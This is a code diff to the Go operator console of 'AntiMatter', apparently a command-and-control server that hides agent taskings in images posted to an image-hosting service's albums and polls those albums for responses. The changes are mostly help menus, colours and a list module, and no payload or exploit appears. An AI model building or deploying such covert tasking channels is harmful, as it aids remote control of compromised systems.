@@ -1,12 +1,14 @@
 // TODO:
 // Error handling []
-// Display walkthroughs for each module []
+// Display walkthroughs for each module [√]
 // Set up mysql and configure it for multiple agent handlings []
 // Error handling for existing tables and what not [√]
+// Set up tasking module / Database []
 // Fix some of the verbiage on the modules so that it makes a bit more sense []
 // Maybe some autocomplete and up arrow stuff []
 // Add the ability to upload to other albums []
 // Change all the options so that when you type "options" and the value exists, it queries the database and not the global maps []
+// 		--> Eh, I think this is fine, I'll try and see what others think
 
 /*
  My thought right now is that this will look for any descriptions that mention the word "response"
@@ -21,9 +23,6 @@
  5. C2 Server will pull any album it has marked as "ACTIVE", and see if there are any new images
  6. Either alert the operator or have to operator do a manual check, and show that there is a new image with a reponse in it
  7. Either auto-show the response to the operator or have the operator use the Reponse module to check the response for a particular target
-
-
-
 
 */
 
@@ -89,7 +88,7 @@ func yesNo() bool {
 
 func main() {
 	for {
-		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit", "Init"}
+		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Init", "Quit", "Exit"}
 		validate := func(input string) error {
 			// _, err := strconv.ParseFloat(input, 64)
 			found := validateOptions(options, input)
@@ -126,8 +125,8 @@ func main() {
 
 		if strings.EqualFold(result, "options") {
 			fmt.Println("")
-			fmt.Println("Valid Commands		Description")
-			fmt.Println("---------------         ------------") // Literally just aethetic
+			fmt.Println(color.YellowString("[ Valid Commands ]	[ Description ]"))
+			fmt.Println("------------------      ---------------") // Literally just aethetic
 			fmt.Println(" ")
 			fmt.Println(" Image		Create an Image for agent tasking")
 			fmt.Println(" Album		Create an Album for agent responses")
@@ -135,9 +134,13 @@ func main() {
 			fmt.Println(" List		List images, albums, agents, and tasks")
 			fmt.Println(" Response	Search for any pending responses within an album")
 			fmt.Println(" Options	List out different options/modules you can choose from")
-			fmt.Println(" Init		Have the server walk you through filling in the options you need")
+			//	fmt.Println(" Init		Have the server walk you through filling in the options you need")
 			fmt.Println(" Exit		Exit program")
 			fmt.Println("")
+			fmt.Println(color.YellowString("[ The order these should be run in ] "))
+			fmt.Println(" ")
+			fmt.Println("1. Image\n2. Album\n3. Task\n4. Response")
+			fmt.Println(" ")
 		}
 
 		if strings.EqualFold(result, "exit") {
@@ -153,11 +156,9 @@ func main() {
 				text, _ := reader.ReadString('\n')
 
 				if strings.TrimRight(text, "\n") == "options" {
-					fmt.Println("\n---OPTIONS---")
-					// Check to see if this value is set from the Album module
-					if val, ok := albumOptions["AlbumID"]; ok {
-						imageOptions["AlbumID"] = val
-					}
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
+
 					for key, value := range imageOptions {
 						if value == "" {
 
@@ -168,6 +169,16 @@ func main() {
 
 					}
 					fmt.Println(" ")
+				} else if strings.Contains(text, "help") {
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ HOW TO USE ]=="))
+					fmt.Println("set <option> <value>")
+					fmt.Println("TO RUN MODULE: go")
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS THAT NEED TO BE SET ]=="))
+					fmt.Println("client-id\ncommand\nbase-image\nnew-filename")
+					fmt.Println(" ")
+
 				} else if strings.Contains(text, "set") {
 
 					// TODO: If this isn't set it breaks, handle that
@@ -187,9 +198,6 @@ func main() {
 						clientID := strings.Split(text, "client-id ")
 						imageOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
 
-					} else if strings.Contains(text, "album-id") {
-						albumID := strings.Split(text, "album-id ")
-						imageOptions["AlbumID"] = strings.Replace(strings.Join(albumID[1:], ""), "\n", "", -1)
 					}
 
 				} else if strings.Contains(text, "go") {
@@ -230,7 +238,8 @@ func main() {
 				}
 
 				if strings.TrimRight(text, "\n") == "options" {
-					fmt.Println("\n---OPTIONS---")
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
 
 					for key, value := range albumOptions {
 						if value == "" {
@@ -243,6 +252,16 @@ func main() {
 					}
 
 					fmt.Println(" ")
+				} else if strings.Contains(text, "help") {
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ HOW TO USE ]=="))
+					fmt.Println("set <option> <value>")
+					fmt.Println("TO RUN MODULE: go")
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS THAT NEED TO BE SET ]=="))
+					fmt.Println("title")
+					fmt.Println(" ")
+
 				} else if strings.Contains(text, "set") {
 					if strings.Contains(text, "title") {
 						title := strings.Split(text, "title ")
@@ -254,7 +273,8 @@ func main() {
 					}
 
 				} else if strings.Contains(text, "list") {
-					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Album Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"], "|", color.CyanString("Title:"), albumOptions["Title"])
+					fmt.Println("\n", color.CyanString("AlbumHash:"), albumOptions["Album Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"], "|", color.CyanString("Title:"), albumOptions["Title"])
+					fmt.Println(" ")
 
 				} else if strings.Contains(text, "go") {
 					albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], albumOptions["Client-ID"])
@@ -281,7 +301,8 @@ func main() {
 				text := strings.ToLower(initialText)
 
 				if strings.TrimRight(text, "\n") == "options" {
-					fmt.Println("\n---OPTIONS---")
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
 
 					// Check to see if this value was set in the Image module
 					if val, ok := imageOptions["ClientID"]; ok {
@@ -302,6 +323,16 @@ func main() {
 
 					}
 					fmt.Println(" ")
+				} else if strings.Contains(text, "help") {
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ HOW TO USE ]=="))
+					fmt.Println("set <option> <value>")
+					fmt.Println("TO RUN MODULE: go")
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS THAT NEED TO BE SET ]=="))
+					fmt.Println("description\ntasking-image\ntitle")
+					fmt.Println(" ")
+
 				} else if strings.Contains(text, "set") {
 					if strings.Contains(text, "title") {
 						taskTitle := strings.Split(text, "title ")
@@ -343,12 +374,12 @@ func main() {
 
 					// Here ask the user if they want to upload the previously created image to this new album
 
-					confirmAdd := yesNo()
-					if confirmAdd {
-						cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
-						fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
-						internal.InsertTask(taskOptions["TaskingImageRaw"], taskOptions["Title"], taskOptions["Description"], imageID.(string), deletehash.(string))
-					}
+					//confirmAdd := yesNo()
+					//if confirmAdd {
+					cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
+					fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
+					internal.InsertTask(taskOptions["TaskingImageRaw"], taskOptions["Title"], taskOptions["Description"], imageID.(string), deletehash.(string))
+					//}
 					//fmt.Println(success, "|", status)
 
 				} else if strings.Contains(text, "exit") {
@@ -403,7 +434,8 @@ func main() {
 				}
 
 				if strings.TrimRight(text, "\n") == "options" {
-					fmt.Println("\n---OPTIONS---")
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
 
 					for key, value := range responseOptions {
 						if value == "" {
@@ -428,7 +460,7 @@ func main() {
 					}
 					defer response.Body.Close()
 
-					//open a file for writing
+					// open a file for writing
 					// Should probably have the user define what and where to call this
 					file, err := os.Create("/tmp/asdf.jpg")
 					if err != nil {
@@ -462,20 +494,38 @@ func main() {
 			fmt.Println("This will walk you through the options that you need to get this started")
 
 		}
-		if strings.EqualFold(result, "Delete") {
+
+		if strings.EqualFold(result, "List") {
 			for {
 				reader := bufio.NewReader(os.Stdin)
 				color.Set(color.FgGreen)
-				fmt.Print("AntiMatter/Response >> ")
+				fmt.Print("AntiMatter/List >> ")
 				color.Unset()
 				// Had to do this since case sensitivity is dumb in golang
 				initialText, _ := reader.ReadString('\n')
 				text := strings.ToLower(initialText)
 
-				if strings.Contains(text, "list") {
-					fmt.Println("\n---IMAGES---")
+				if strings.Contains(text, "help") {
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
+					fmt.Println(color.GreenString("To list images:"), "list images")
+					fmt.Println(color.GreenString("To list albums:"), "list albums")
+					fmt.Println(color.GreenString("To list taskings:"), "list taskings")
 					fmt.Println(" ")
 
+				} else if strings.Contains(text, "list images") {
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("===[ IMAGES ]==="))
+					internal.GetImages()
+					fmt.Println(" ")
+				} else if strings.Contains(text, "list albums") {
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("===[ ALBUMS ]==="))
+					internal.GetAlbums()
+					fmt.Println(" ")
+
+				} else if strings.Contains(text, "exit") {
+					break
 				}
 			}
 		}
